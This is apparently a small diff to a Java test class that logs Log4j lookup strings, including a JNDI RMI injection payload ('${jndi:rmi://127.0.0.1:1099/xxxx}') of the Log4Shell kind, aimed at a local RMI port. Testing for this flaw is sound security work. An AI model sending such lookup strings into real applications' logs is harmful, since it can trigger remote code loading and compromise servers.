@@ -6,6 +6,6 @@ public class dome {
     public static void main(String[] args){
         String msg="${java:hw}";
         logger.info(msg);
-        logger.error("${jndi:rmi://127.0.0.1:1099/xxxx}");
+        logger.error("1${jndi:rmi://127.0.0.1:1099/xxxx}");
     }
 }
